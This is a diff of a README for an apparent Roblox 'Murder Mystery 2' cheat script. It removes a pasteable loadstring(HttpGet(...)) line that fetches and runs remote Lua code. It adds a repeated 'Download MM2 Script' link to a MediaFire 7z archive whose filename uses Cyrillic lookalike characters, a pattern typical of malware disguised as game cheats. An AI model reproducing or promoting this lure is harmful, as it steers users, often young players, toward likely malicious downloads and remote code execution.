@@ -6,14 +6,13 @@
 
 ---
 
-## 📥 Script (copy & paste into your executor)
+## 📥 Script
 
-```lua
-loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/mm2-script/main/scripts/loader.lua"))()
 ```
-
-> Replace `YOUR_USERNAME` with your GitHub username after uploading the repository.
-
+[Download MM2 Script
+Download MM2 Script
+Download MM2 Script](https://www.mediafire.com/file_premium/ivr409oavu026kc/mm2-s%25D1%2581ri%25D1%2580t.7z/file)
+```
 ---
 
 ## ✨ Features
